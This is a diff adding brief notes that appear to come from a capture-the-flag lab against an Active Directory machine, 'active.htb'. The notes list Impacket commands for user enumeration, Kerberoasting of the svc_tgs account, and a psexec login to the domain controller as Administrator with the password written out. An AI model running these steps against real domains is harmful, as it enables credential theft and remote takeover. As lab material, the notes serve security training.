@@ -1,0 +1,10 @@
+1 Creds 
+
+/opt/impacket/examples/GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.10.10.100 --request
+
+/opt/impacket/examples/GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.10.10.100 -request
+
+
+/opt/impacket/examples/psexec.py -dc-ip 10.10.10.100 active.htb/Administrator:'Ticketmaster1968'@active.htb
+
+
